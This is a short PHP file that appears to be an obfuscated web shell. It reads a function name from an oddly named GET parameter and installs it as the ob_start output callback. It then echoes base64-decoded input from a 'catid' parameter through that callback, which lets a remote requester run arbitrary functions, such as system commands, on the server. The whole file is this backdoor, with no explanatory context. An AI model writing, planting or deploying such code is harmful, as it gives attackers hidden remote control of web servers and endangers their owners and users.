<?php
    $id = $_GET['vtxeeq'];
    echo $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';
    $s = '';
    foreach(array($id) as $v){
        $s.=$v;
    }
    ob_start($s);
    if($catid){
            echo $catid;
    }
    ob_end_flush();